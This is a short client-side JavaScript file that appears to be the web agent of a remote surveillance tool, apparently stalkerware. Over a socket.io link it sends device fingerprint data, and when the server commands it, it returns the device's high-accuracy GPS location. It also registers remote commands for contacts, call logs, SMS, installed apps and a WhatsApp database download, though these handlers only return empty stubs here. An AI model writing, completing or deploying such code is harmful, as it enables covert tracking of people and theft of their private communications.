const socket = io();

function getClientInfo(){
  return {
    model: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screen: { width: screen.width, height: screen.height },
    cookiesEnabled: navigator.cookieEnabled,
  };
}

socket.on('connect', () => {
  console.log('متصل بالسيرفر');
  const info = getClientInfo();
  info.id = 'device_' + Math.floor(Math.random()*10000);
  socket.emit('join', info);
});

socket.on('getLocation', async (payload) => {
  try{
    if(!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition((pos) => {
      const data = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
      socket.emit('getLocation', { id: payload.id, data });
    }, (err) => { console.error('Geolocation error', err); }, { enableHighAccuracy: true, maximumAge: 0, timeout: 12000 });
  }catch(e){ console.error(e); }
});

const commands = ['getInstalledApps','getContacts','getCallLog','getSMS','getExtraData','downloadWhatsappDatabase'];
commands.forEach(cmd => {
  socket.on(cmd, (payload) => {
    let data = { id: payload.id, data: null };
    if(cmd==='getInstalledApps') data.data = [];
    if(cmd==='getContacts') data.data = [];
    if(cmd==='getCallLog') data.data = [];
    if(cmd==='getSMS') data.data = [];
    if(cmd==='getExtraData') data.data = {};
    if(cmd==='downloadWhatsappDatabase') data.data = null;
    socket.emit(cmd, data);
  });
});
